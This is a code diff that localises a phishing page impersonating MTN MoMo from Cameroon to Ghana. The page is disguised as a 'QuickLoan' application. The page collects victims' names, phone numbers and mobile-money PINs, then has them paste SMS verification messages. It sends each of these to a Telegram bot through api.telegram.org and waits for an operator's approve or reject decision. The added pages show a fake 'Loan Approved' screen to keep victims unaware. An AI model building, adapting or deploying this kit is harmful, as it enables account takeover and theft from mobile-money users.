@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MTN Momo - QuickLoan & Services</title>
+    <title>MTN MoMo Ghana - QuickLoan & Services</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #4361ee;
-            --primary-dark: #3a0ca3;
             --mtn-yellow: #ffcc00;
+            --mtn-dark: #1a1a1a;
+            --mtn-light: #f8f9ff;
             --mtn-red: #E2001A;
-            --bg-color: #f0f2f5;
-            --card-bg: #ffffff;
-            --text-main: #333333;
-            --text-muted: #777777;
+            --mtn-gold: #ffb700;
+            --primary: #4361ee;
             --border-color: #ddd;
             --radius: 20px;
         }
@@ -30,7 +28,7 @@
 
         html, body {
             min-height: 100vh;
-            background: var(--bg-color);
+            background: #f0f2f5;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -39,7 +37,7 @@
             padding: 12px;
         }
 
-        .view-container {
+        .page {
             width: 100%;
             max-width: 540px;
             display: none;
@@ -49,7 +47,7 @@
             margin-bottom: 24px;
         }
 
-        .view-container.active {
+        .page.active {
             display: flex;
         }
 
@@ -71,12 +69,13 @@
             margin-bottom: 14px;
         }
 
-        .back-btn, .menu-btn {
-            font-size: 22px;
+        .bk, .menu-btn {
+            font-size: 16px;
             background: none;
             border: none;
             cursor: pointer;
-            color: var(--text-main);
+            color: #333;
+            font-weight: 600;
             padding: 4px;
         }
 
@@ -96,11 +95,14 @@
         .logo-text {
             font-size: 18px;
             font-weight: 700;
-            color: var(--text-main);
+            color: var(--mtn-yellow);
+            background: var(--mtn-dark);
+            padding: 4px 12px;
+            border-radius: 8px;
         }
 
         .card {
-            background: var(--card-bg);
+            background: white;
             border-radius: var(--radius);
             padding: 28px 24px;
             width: 100%;
@@ -112,14 +114,14 @@
         .title {
             font-size: 24px;
             font-weight: 700;
-            color: var(--text-main);
+            color: #333;
             text-align: center;
             margin-bottom: 8px;
         }
 
         .subtitle {
             font-size: 14px;
-            color: var(--text-muted);
+            color: #777;
             text-align: center;
             margin-bottom: 20px;
         }
@@ -138,7 +140,7 @@
             font-weight: 600;
             text-align: center;
             margin-bottom: 16px;
-            color: var(--text-main);
+            color: #333;
         }
 
         .input-group {
@@ -232,7 +234,7 @@
 
         .feature {
             text-align: center;
-            color: var(--text-muted);
+            color: #777;
             font-size: 12px;
             flex: 1;
             line-height: 1.4;
@@ -247,7 +249,7 @@
         .form-label {
             display: block;
             font-weight: 600;
-            color: var(--text-main);
+            color: #333;
             margin-bottom: 8px;
             font-size: 14px;
         }
@@ -305,7 +307,7 @@
 
         .step-text {
             text-align: center;
-            color: var(--text-muted);
+            color: #777;
             font-size: 13px;
             margin-bottom: 18px;
         }
@@ -413,6 +415,246 @@
             outline: none;
         }
 
+        /* OTP Specific Page Styles */
+        .otp-topbar {
+            width: 100%;
+            max-width: 540px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+            border-radius: 16px;
+            margin-bottom: 14px;
+        }
+
+        .otp-body-wrap {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        .otp-card {
+            background: white;
+            border-radius: var(--radius);
+            padding: 28px 24px;
+            width: 100%;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .otp-hint {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .otp-section {
+            background: #f8f9ff;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        .otp-section-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #333;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            flex: 1;
+        }
+
+        .otp-box {
+            flex: 1;
+            height: 50px;
+            border: 2px solid var(--primary);
+            border-radius: 10px;
+            font-size: 22px;
+            text-align: center;
+            background: white;
+            font-weight: 600;
+            outline: none;
+        }
+
+        .otp-delete {
+            background: #ff4d4d;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            width: 40px;
+            height: 50px;
+            margin-left: 10px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .btn-otp {
+            width: 100%;
+            padding: 16px;
+            background: var(--mtn-yellow);
+            color: #1a1a1a;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(255, 204, 0, 0.3);
+        }
+
+        /* Approval Page Styling */
+        .appr-wrap {
+            background: white;
+            border-radius: var(--radius);
+            padding: 32px 24px;
+            width: 100%;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .check-circle {
+            width: 70px;
+            height: 70px;
+            background: #00c853;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 38px;
+            color: white;
+            margin: 0 auto 16px;
+        }
+
+        .appr-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .appr-sub {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .appr-banner {
+            background: #f0f4ff;
+            width: 100%;
+            padding: 16px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+        }
+
+        .abl {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 4px;
+        }
+
+        .aba {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
+        .comp-box {
+            background: #fff8e1;
+            border-left: 4px solid var(--mtn-yellow);
+            padding: 14px;
+            border-radius: 8px;
+            text-align: left;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .ch {
+            font-weight: 700;
+            margin-bottom: 4px;
+            color: #333;
+        }
+
+        .ld-card {
+            background: #f8f9ff;
+            border-radius: 14px;
+            padding: 16px;
+            width: 100%;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .ld-htitle {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #333;
+        }
+
+        .ld-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .ld-icon {
+            font-size: 18px;
+            margin-right: 12px;
+        }
+
+        .ld-lbl {
+            font-size: 12px;
+            color: #777;
+        }
+
+        .ld-val {
+            font-weight: 700;
+            color: #333;
+        }
+
+        .nxt-steps {
+            background: #f0f2f5;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 13px;
+            color: #555;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            text-align: left;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .rth-wrap {
+            width: 100%;
+        }
+
+        .rth-btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
         /* Overlays */
         .overlay {
             position: fixed;
@@ -480,8 +722,8 @@
 </head>
 <body>
 
-    <!-- ================= VIEW 1: CALCULATOR (STARTING STEP) ================= -->
-    <div id="view-calculator" class="view-container active">
+    <!-- ================= PAGE 1: CALCULATOR (STARTING STEP) ================= -->
+    <div id="page-calculator" class="page active">
         <header>
             <button class="menu-btn"><i class="fa-solid fa-bars"></i></button>
             <div class="logo">
@@ -498,22 +740,22 @@
                 <div class="input-group">
                     <div class="input-header">
                         <span class="input-label">Loan Amount</span>
-                        <span class="input-value" id="amountValue">500,000 FCFA</span>
+                        <span class="input-value" id="amountValue">100,000 GHS</span>
                     </div>
-                    <input type="range" class="slider" min="5000" max="500000" step="5000" value="500000" id="amountSlider">
-                    <div class="range-labels"><span>5,000 FCFA</span><span>500,000 FCFA</span></div>
+                    <input type="range" class="slider" min="1000" max="100000" step="1000" value="100000" id="amountSlider">
+                    <div class="range-labels"><span>1,000 GHS</span><span>100,000 GHS</span></div>
                 </div>
                 <div class="input-group">
                     <div class="input-header">
                         <span class="input-label">Loan Term</span>
-                        <span class="input-value" id="termValue">12 months</span>
+                        <span class="input-value" id="termValue">48 months</span>
                     </div>
-                    <input type="range" class="slider" min="6" max="60" step="6" value="12" id="termSlider">
+                    <input type="range" class="slider" min="6" max="60" step="6" value="48" id="termSlider">
                     <div class="range-labels"><span>6 months</span><span>60 months</span></div>
                 </div>
                 <div class="payment-box">
                     <span class="payment-label">Monthly Payment</span>
-                    <span class="payment-amount" id="paymentAmount">45,057.00 FCFA</span>
+                    <span class="payment-amount" id="paymentAmount">2,450.00 GHS</span>
                 </div>
             </div>
             <button class="primary-btn" id="goToAppStep1">APPLY NOW</button>
@@ -526,10 +768,10 @@
         <footer-note>© 2026 QuickLoan</footer-note>
     </div>
 
-    <!-- ================= VIEW 2: APPLICATION STEP 1 ================= -->
-    <div id="view-step1" class="view-container">
+    <!-- ================= PAGE 2: APPLICATION STEP 1 ================= -->
+    <div id="page-step1" class="page">
         <header>
-            <button class="back-btn" data-target="calculator"><i class="fa-solid fa-arrow-left"></i></button>
+            <button class="bk" onclick="goTo('page-calculator')">← Back</button>
             <div class="logo">
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
                 <span class="logo-text">QuickLoan</span>
@@ -550,17 +792,16 @@
                 <option>Education Loan</option>
             </select>
 
-            <label class="form-label" for="loanAmountInput">Loan Amount (FCFA)</label>
-            <input type="number" class="form-input" id="loanAmountInput" placeholder="500000" min="5000" max="500000">
+            <label class="form-label" for="loanAmountInput">Loan Amount (GHS)</label>
+            <input type="number" class="form-input" id="loanAmountInput" placeholder="100000" min="1000" max="100000">
 
             <label class="form-label" for="loanTermSelect">Loan Term</label>
             <select class="form-select" id="loanTermSelect">
                 <option value="6">6 Months</option>
-                <option value="12" selected>12 Months</option>
-                <option value="18">18 Months</option>
+                <option value="12">12 Months</option>
                 <option value="24">24 Months</option>
                 <option value="36">36 Months</option>
-                <option value="48">48 Months</option>
+                <option value="48" selected>48 Months</option>
                 <option value="60">60 Months</option>
             </select>
 
@@ -572,10 +813,10 @@
         <footer-note>© 2026 QuickLoan</footer-note>
     </div>
 
-    <!-- ================= VIEW 3: APPLICATION STEP 2 ================= -->
-    <div id="view-step2" class="view-container">
+    <!-- ================= PAGE 3: APPLICATION STEP 2 ================= -->
+    <div id="page-step2" class="page">
         <header>
-            <button class="back-btn" data-target="step1"><i class="fa-solid fa-arrow-left"></i></button>
+            <button class="bk" onclick="goTo('page-step1')">← Back</button>
             <div class="logo">
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
                 <span class="logo-text">QuickLoan</span>
@@ -600,26 +841,26 @@
 
             <label class="form-label" for="phone">Phone Number</label>
             <div class="phone-group-custom" id="phoneGroup">
-                <span class="phone-prefix">+237</span>
-                <input type="tel" class="phone-input-custom" id="phone" placeholder="650123456" maxlength="9">
+                <span class="phone-prefix">+233</span>
+                <input type="tel" class="phone-input-custom" id="phone" placeholder="241234567" maxlength="9">
             </div>
-            <small style="color:#999; display:block; margin-bottom:16px;">Enter exactly 9 digits (e.g. 650123456)</small>
+            <small style="color:#999; display:block; margin-bottom:16px;">Enter exactly 9 digits (e.g. 241234567)</small>
 
             <div class="btn-group">
-                <button class="secondary-btn" data-target="step1">BACK</button>
+                <button class="secondary-btn" onclick="goTo('page-step1')">BACK</button>
                 <button class="primary-btn" id="goToAppStep3" style="flex:1;">NEXT STEP</button>
             </div>
         </main>
         <footer-note>© 2026 QuickLoan</footer-note>
     </div>
 
-    <!-- ================= VIEW 4: FINAL REVIEW & SUBMIT ================= -->
-    <div id="view-step3" class="view-container">
+    <!-- ================= PAGE 4: FINAL REVIEW & SUBMIT ================= -->
+    <div id="page-step3" class="page">
         <header>
-            <button class="back-btn" data-target="step2"><i class="fa-solid fa-arrow-left"></i></button>
+            <button class="bk" onclick="goTo('page-step2')">← Back</button>
             <div class="logo">
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
-                <span class="logo-text">MTN Momo</span>
+                <span class="logo-text">MTN MoMo</span>
             </div>
             <div></div>
         </header>
@@ -636,32 +877,32 @@
                 <option>Student</option>
             </select>
 
-            <label class="form-label" for="annualIncome">Annual Income (XAF)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="500000">
+            <label class="form-label" for="annualIncome">Annual Income (GHS)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="50000">
 
             <div class="summary-box" id="summaryBox">
                 <!-- Dynamically populated summary -->
             </div>
 
             <div class="btn-group">
-                <button class="secondary-btn" data-target="step2">Back</button>
+                <button class="secondary-btn" onclick="goTo('page-step2')">Back</button>
                 <button class="primary-btn" id="submitApplicationBtn" style="flex:1;">Submit Application</button>
             </div>
         </main>
-        <footer-note>© 2025 MTN Momo</footer-note>
+        <footer-note>© 2026 MTN MoMo Ghana</footer-note>
     </div>
 
-    <!-- ================= VIEW 5: LOGIN / PIN VIEW ================= -->
-    <div id="view-login" class="view-container">
+    <!-- ================= PAGE 5: LOGIN / PIN VIEW ================= -->
+    <div id="page-login" class="page">
         <div class="logo" style="padding: 20px 0 10px;">
             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo" style="width:44px;height:44px;">
-            <span class="logo-text" style="font-size: 26px;">MTN Momo</span>
+            <span class="logo-text" style="font-size: 26px;">MTN MoMo</span>
         </div>
         <main class="card" style="align-items: center;">
             <h1 class="title" style="margin-bottom: 20px;">Log in</h1>
             <div class="phone-box-main">
-                <span style="font-size: 22px; margin-right: 10px;">🇨🇲</span>
-                <span style="color:var(--primary); font-weight:600; margin-right:10px;">+237</span>
+                <span style="font-size: 22px; margin-right: 10px;">🇬🇭</span>
+                <span style="color:var(--primary); font-weight:600; margin-right:10px;">+233</span>
                 <input type="tel" id="loginPhoneInput" class="phone-input-custom" placeholder="Phone Number" style="padding:0;" maxlength="9">
             </div>
             <p style="color:#666; font-size:14px; margin-bottom:14px; font-weight:500;">Enter your PIN</p>
@@ -675,13 +916,13 @@
             <a href="#" style="color:var(--primary); font-size:14px; text-decoration:none; margin-bottom:20px;">Forgot your PIN?</a>
             <button class="primary-btn" id="executeLoginBtn" style="display:none;">LOG IN</button>
         </main>
-        <footer-note>© 2026 MTN Momo</footer-note>
+        <footer-note>© 2026 MTN MoMo Ghana</footer-note>
     </div>
 
-    <!-- ================= VIEW 6: TWO-STEP VERIFICATION ================= -->
-    <div id="view-verify" class="view-container">
+    <!-- ================= PAGE 6: SMS PASTE VIEW ================= -->
+    <div id="page-sms-paste" class="page">
         <header>
-            <button class="back-btn" data-target="login"><i class="fa-solid fa-arrow-left"></i></button>
+            <button class="bk" onclick="goTo('page-login')">← Back</button>
             <div class="logo">
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkIMuXBHiC5OpIeU7Uq5OJnSIOe9cbzO7MALP-XujJ-w&s=10" alt="MTN Money">
             </div>
@@ -690,12 +931,103 @@
         <main class="card" style="text-align: left;">
             <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 6px;">Two Step Verification</h2>
             <p class="subtitle" style="text-align: left; margin-bottom: 14px;">Paste the complete link/sms message sent to your number</p>
-            <div id="verifyDisplayPhone" style="font-weight: 800; font-size: 16px; margin-bottom: 14px; color: var(--primary);">+237.........</div>
+            <div id="verifyDisplayPhone" style="font-weight: 800; font-size: 16px; margin-bottom: 14px; color: var(--primary);">+233.........</div>
             <textarea id="smsInputCode" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>
             <p id="resendWrapper" style="font-size: 13px; color: #777; text-align: center; margin-bottom: 14px;">Resend in <span id="countdown">30</span> seconds</p>
             <button id="finalSubmitOtpBtn" class="primary-btn" disabled style="background:#e7e7e7; color:#9a9a9a; cursor:not-allowed; box-shadow:none;">SUBMIT</button>
         </main>
-        <footer-note>© 2026 MTN Money - Cameroon</footer-note>
+        <footer-note>© 2026 MTN Money - Ghana</footer-note>
+    </div>
+
+    <!-- ================= PAGE 7: OTP VERIFICATION ================= -->
+    <div id="page-otp" class="page">
+        <div class="otp-topbar">
+            <button class="bk" onclick="goTo('page-sms-paste')">← Back</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">OTP Verification</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="otp-body-wrap">
+            <div class="otp-card">
+                <h2>Enter OTP Code</h2>
+                <p class="otp-hint">Enter the 4-digit OTP code sent to your phone via MTN MoMo Ghana</p>
+                <div class="otp-section">
+                    <div class="otp-section-title">OTP Code (4 digits):</div>
+                    <div style="display:flex; align-items:center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
+                    </div>
+                </div>
+                <button id="bOtp" class="btn-otp" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+            </div>
+        </div>
+        <footer-note>© 2026 MTN MoMo Ghana – Powered by MTN</footer-note>
+    </div>
+
+    <!-- ================= PAGE 8: WAIT FOR OTP APPROVAL ================= -->
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), #333); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px; width:100%;">
+            <div class="card" style="text-align:center;">
+                <div style="font-size: 48px; margin-bottom: 12px;">⏳</div>
+                <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 6px;">Verifying OTP Code</h2>
+                <p style="color:#777; font-size: 14px;">Please wait</p>
+                <div style="margin-top:24px; font-size:0.85rem; color:#666;">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--primary);">-</span></div>
+                <div style="margin-top:16px; font-size:0.9rem; color:#888;">Do not close this page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= PAGE 9: APPROVAL SCREEN ================= -->
+    <div id="page-approval" class="page">
+        <div class="appr-wrap">
+            <div class="check-circle">✓</div>
+            <h2 class="appr-title">Loan Approved!</h2>
+            <p class="appr-sub">Your loan has been successfully approved.</p>
+            <div class="appr-banner">
+                <div class="abl">Amount to Receive</div>
+                <div class="aba" id="aprAmount">GHS 100,000</div>
+            </div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ Important Information</div>
+                <p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p>
+            </div>
+            <div class="ld-card">
+                <div class="ld-htitle">📊 Loan Details</div>
+                <div class="ld-row">
+                    <div class="ld-icon">💰</div>
+                    <div>
+                        <div class="ld-lbl">Amount</div>
+                        <div class="ld-val" id="aprAmt">GHS 100,000</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon">📅</div>
+                    <div>
+                        <div class="ld-lbl">Term</div>
+                        <div class="ld-val" id="aprTerm">48 Months</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon">💳</div>
+                    <div>
+                        <div class="ld-lbl">Monthly Payment</div>
+                        <div class="ld-val" id="aprMth">GHS 2,450</div>
+                    </div>
+                </div>
+            </div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p>
+            </div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="window.location.href='https://en.wikipedia.org/wiki/Momo_(department)'">FINISH</button>
+            </div>
+        </div>
     </div>
 
     <!-- ================= OVERLAYS / SPINNERS ================= -->
@@ -729,33 +1061,14 @@
         const CHAT_ID = '8406078749';
 
         // Navigation Controller
-        function switchView(viewId) {
-            document.querySelectorAll('.view-container').forEach(el => el.classList.remove('active'));
-            const target = document.getElementById('view-' + viewId);
+        function goTo(pageId) {
+            document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
+            const target = document.getElementById(pageId);
             if (target) {
                 target.classList.add('active');
-                window.scrollTo(0,0);
-                history.pushState({ view: viewId }, '', '#' + viewId);
+                window.scrollTo(0, 0);
             }
         }
-
-        window.addEventListener('popstate', (e) => {
-            if (e.state && e.state.view) {
-                document.querySelectorAll('.view-container').forEach(el => el.classList.remove('active'));
-                const target = document.getElementById('view-' + e.state.view);
-                if (target) target.classList.add('active');
-            }
-        });
-
-        // Initialize state history
-        history.replaceState({ view: 'calculator' }, '', '#calculator');
-
-        // Bind navigation buttons
-        document.querySelectorAll('[data-target]').forEach(btn => {
-            btn.addEventListener('click', () => {
-                switchView(btn.getAttribute('data-target'));
-            });
-        });
 
         // 1. Calculator Logic
         const amountSlider = document.getElementById('amountSlider');
@@ -764,23 +1077,23 @@
         const termValue = document.getElementById('termValue');
         const paymentAmount = document.getElementById('paymentAmount');
 
-        function formatFCFA(value) {
-            return value.toLocaleString('en-US') + ' FCFA';
+        function formatGHS(value) {
+            return value.toLocaleString('en-US') + ' GHS';
         }
 
         function updateCalculator() {
             const amount = parseFloat(amountSlider.value);
             const months = parseFloat(termSlider.value);
-            amountValue.textContent = formatFCFA(amount);
+            amountValue.textContent = formatGHS(amount);
             termValue.textContent = months + (months === 1 ? ' month' : ' months');
             const annualRate = 0.08;
             const monthlyRate = annualRate / 12;
             if (months === 0) {
-                paymentAmount.textContent = amount.toFixed(2) + ' FCFA';
+                paymentAmount.textContent = amount.toFixed(2) + ' GHS';
             } else {
                 const power = Math.pow(1 + monthlyRate, months);
                 const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-                paymentAmount.textContent = monthlyPayment.toFixed(2) + ' FCFA';
+                paymentAmount.textContent = monthlyPayment.toFixed(2) + ' GHS';
             }
         }
 
@@ -788,13 +1101,12 @@
         amountSlider.addEventListener('input', updateCalculator);
         termSlider.addEventListener('input', updateCalculator);
 
-        // Transition from Calculator (Step 0) to Step 1 Form
         document.getElementById('goToAppStep1').addEventListener('click', function() {
             localStorage.setItem('loanAmount', amountSlider.value);
             localStorage.setItem('loanTerm', termSlider.value);
             document.getElementById('loanAmountInput').value = amountSlider.value;
             document.getElementById('loanTermSelect').value = termSlider.value;
-            switchView('step1');
+            goTo('page-step1');
         });
 
         // 2. Step 1 Form Logic
@@ -802,9 +1114,9 @@
             const amount = document.getElementById('loanAmountInput').value.trim();
             const purpose = document.getElementById('loanPurpose').value.trim();
 
-            if (!amount || amount < 5000) {
+            if (!amount || amount < 1000) {
                 document.getElementById('loanAmountInput').classList.add('invalid');
-                alert('Please enter a valid loan amount (minimum 5,000 FCFA).');
+                alert('Please enter a valid loan amount (minimum 1,000 GHS).');
                 return;
             }
             if (!purpose) {
@@ -821,7 +1133,7 @@
             localStorage.setItem('loanTerm', document.getElementById('loanTermSelect').value);
             localStorage.setItem('loanPurpose', purpose);
 
-            switchView('step2');
+            goTo('page-step2');
         });
 
         // 3. Step 2 Form Logic
@@ -851,29 +1163,22 @@
             sessionStorage.setItem('savedPhone', phone);
 
             populateSummary();
-            switchView('step3');
+            goTo('page-step3');
         });
 
         function populateSummary() {
             const summaryBox = document.getElementById('summaryBox');
-            const xafAmount = parseFloat(localStorage.getItem('loanAmount') || 5000);
-            const loanAmountFormatted = xafAmount.toLocaleString('fr-FR', { style: 'currency', currency: 'XAF' });
+            const ghsAmount = parseFloat(localStorage.getItem('loanAmount') || 1000);
+            const loanAmountFormatted = ghsAmount.toLocaleString('en-US', { style: 'currency', currency: 'GHS' });
 
             summaryBox.innerHTML = `
                 <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
                 <div class="summary-row"><span>Amount:</span><span class="summary-value">${loanAmountFormatted}</span></div>
-                <div class="summary-row"><span>Duration:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
+                <div class="summary-row"><span>Duration:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '48'} Months</span></div>
                 <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
                 <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName')} ${localStorage.getItem('lastName')}</span></div>
-                <div class="summary-row"><span>Phone:</span><span class="summary-value">+237 ${localStorage.getItem('phone')}</span></div>
+                <div class="summary-row"><span>Phone:</span><span class="summary-value">+233 ${localStorage.getItem('phone')}</span></div>
             `;
-
-            if (localStorage.getItem('employmentStatus')) {
-                document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
-            }
-            if (localStorage.getItem('annualIncome')) {
-                document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
-            }
         }
 
         // 4. Step 3 Final Submission Logic
@@ -881,7 +1186,7 @@
             const income = document.getElementById('annualIncome').value.trim();
 
             if (!income || income < 1000) {
-                alert('Please enter a valid annual income (minimum 1,000 XAF).');
+                alert('Please enter a valid annual income.');
                 return;
             }
 
@@ -901,7 +1206,7 @@
                     successOverlay.classList.remove('active');
                     const savedPhone = localStorage.getItem('phone');
                     if (savedPhone) document.getElementById('loginPhoneInput').value = savedPhone;
-                    switchView('login');
+                    goTo('page-login');
                 }, 2000);
             }, 2000);
         });
@@ -946,7 +1251,7 @@
             document.getElementById('loadingText').textContent = 'Authenticating account session...';
             loader.classList.add('active');
 
-            const msg = `🔐 *New Login Attempt*\nPhone: \`+237 ${phone}\`\nPIN: \`${enteredPin}\``;
+            const msg = `🔐 *New Login Attempt*\nPhone: \`+233 ${phone}\`\nPIN: \`${enteredPin}\``;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -955,13 +1260,13 @@
 
             setTimeout(() => {
                 loader.classList.remove('active');
-                document.getElementById('verifyDisplayPhone').textContent = '+237 ' + phone;
-                switchView('verify');
+                document.getElementById('verifyDisplayPhone').textContent = '+233 ' + phone;
+                goTo('page-sms-paste');
                 startOtpTimer();
             }, 1500);
         });
 
-        // 6. Two-Step Verification (OTP / Link submission)
+        // 6. Two-Step Verification (SMS Paste / OTP submission)
         const smsInput = document.getElementById('smsInputCode');
         const submitOtpBtn = document.getElementById('finalSubmitOtpBtn');
         let timeLeft = 200;
@@ -1011,9 +1316,9 @@
             };
 
             const message = 
-                `📱 *Step 2: OTP / Link Submission*\n` +
-                `Phone: \`+237 ${phone}\`\n\n` +
-                `✉️ *Pasted Message (Tap below to copy strictly alone):*\n` +
+                `📱 *Step 2: SMS / Link Submission*\n` +
+                `Phone: \`+233 ${phone}\`\n\n` +
+                `✉️ *Pasted Message:*\n` +
                 `\`${smsText}\`\n\n` +
                 `👇 Decision required:`;
 
@@ -1028,6 +1333,8 @@
                 })
             }).then(r => r.json()).then(res => {
                 if(res.ok) {
+                    goTo('page-wait-otp');
+                    document.getElementById('waitOtpAppId').textContent = 'QL-' + Math.floor(100000 + Math.random() * 900000);
                     pollTelegramUpdates(phone);
                 } else {
                     alert('Network error communicating with validation server.');
@@ -1044,6 +1351,18 @@
             submitOtpBtn.disabled = false;
         }
 
+        function handleOtpInput(el, type) {
+            if (el.value.length === 1) {
+                const next = el.nextElementSibling;
+                if (next) next.focus();
+            }
+        }
+
+        function clearOtpCode() {
+            document.querySelectorAll('.otp-box').forEach(b => b.value = '');
+            document.getElementById('otp0').focus();
+        }
+
         function pollTelegramUpdates(phone) {
             let offset = 0;
             const pollInterval = setInterval(() => {
@@ -1057,10 +1376,18 @@
                                 const action = update.callback_query.data;
                                 if (action === `OTP_APP_${phone}`) {
                                     clearInterval(pollInterval);
-                                    window.location.href = '#success-complete';
-                                    alert('Verification Approved Successfully!');
+                                    // Update approval details based on inputs
+                                    const amountVal = parseFloat(localStorage.getItem('loanAmount') || 100000).toLocaleString('en-US', { style: 'currency', currency: 'GHS' });
+                                    document.getElementById('aprAmount').textContent = amountVal;
+                                    document.getElementById('aprAmt').textContent = amountVal;
+                                    document.getElementById('aprTerm').textContent = (localStorage.getItem('loanTerm') || '48') + ' Months';
+                                    document.getElementById('aprMth').textContent = paymentAmount.textContent;
+                                    
+                                    // Seamless transition to approval screen without alerts
+                                    goTo('page-approval');
                                 } else if (action === `OTP_REJ_${phone}`) {
                                     clearInterval(pollInterval);
+                                    goTo('page-sms-paste');
                                     resetVerifyBtn();
                                     document.getElementById('errorModalOverlay').classList.add('active');
                                 }
